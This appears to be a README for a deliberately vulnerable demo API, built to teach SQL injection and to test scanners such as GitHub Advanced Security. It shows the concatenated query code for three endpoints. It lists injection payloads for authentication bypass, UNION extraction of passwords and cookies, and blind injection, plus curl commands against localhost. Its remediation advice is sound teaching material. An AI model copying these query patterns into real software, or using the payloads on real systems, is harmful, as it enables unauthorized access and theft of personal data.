# SQL Injection Vulnerabilities - Security Testing

⚠️ **WARNING**: This document describes intentional SQL injection vulnerabilities implemented for security testing and educational purposes only.

## Overview

This project contains deliberately vulnerable API endpoints designed to demonstrate common SQL injection attacks and help test security scanning tools like GitHub Advanced Security.

## Vulnerabilities Implemented

### 1. Employee Search SQL Injection (CWE-89)

**Endpoint**: `GET /api/employees/search?name={input}`

**Vulnerability**: Direct string concatenation in SQL query without parameterization.

```javascript
const query = `SELECT * FROM employees WHERE first_name LIKE '%${name}%' OR last_name LIKE '%${name}%'`;
```

**Attack Examples**:
- Basic injection: `Smith' OR '1'='1`
- Union-based injection: `Smith' UNION SELECT id,username,password,email,role,created_at,created_at,created_at,created_at FROM users --`
- Comment injection: `Smith' --`

### 2. Authentication Bypass SQL Injection (CWE-89)

**Endpoint**: `POST /api/auth/login`

**Vulnerability**: Direct string concatenation in authentication query.

```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Attack Examples**:
- Authentication bypass: Username: `admin' --`, Password: `anything`
- Universal bypass: Username: `' OR '1'='1' --`, Password: `anything`
- Simple bypass: Username: `' OR 1=1 --`, Password: `anything`

### 3. Employee Detail SQL Injection (CWE-89)

**Endpoint**: `GET /api/employees/{id}`

**Vulnerability**: Direct parameter injection without validation.

```javascript
const query = `SELECT id, first_name, last_name, email, department FROM employees WHERE id = ${id}`;
```

**Attack Examples**:
- Union injection: `1 UNION SELECT userid,user_name,password,cookie FROM user_system_data`
- Boolean-based blind injection: `1 AND (SELECT COUNT(*) FROM users) > 0`

## Database Schema

### Tables Created:
1. **users** - Authentication data
2. **employees** - Employee information with PII
3. **user_system_data** - Sensitive system data

### Sensitive Data Exposed:
- Social Security Numbers
- Employee salaries
- System passwords
- Session cookies
- Personal addresses and phone numbers

## Testing the Vulnerabilities

### Frontend Testing:
1. Navigate to the SECURITY_TEST.EXE section
2. Use the Employee Search or Login System
3. Try the provided injection examples

### API Testing:
```bash
# Basic search
curl "http://localhost:3001/api/employees/search?name=John"

# SQL injection in search
curl "http://localhost:3001/api/employees/search?name=Smith' OR '1'='1"

# Authentication bypass
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'"'"' --", "password": "wrong"}'

# Union injection on employee detail
curl "http://localhost:3001/api/employees/1 UNION SELECT userid,user_name,password,cookie FROM user_system_data"
```

## Expected Security Tool Alerts

GitHub Advanced Security and similar tools should detect:
- **CWE-89**: SQL Injection
- **Unsafe query construction patterns**
- **Potential data exposure warnings**
- **Authentication bypass vulnerabilities**

## Remediation

In production systems, always use:
- **Parameterized queries** / Prepared statements
- **Input validation and sanitization**
- **Least privilege database access**
- **Output encoding**
- **Web Application Firewalls (WAF)**

## Educational Purpose

These vulnerabilities are implemented to:
- Demonstrate common security flaws
- Test security scanning tools
- Provide hands-on learning experience
- Show impact of SQL injection attacks

**Never deploy these vulnerabilities in production environments!**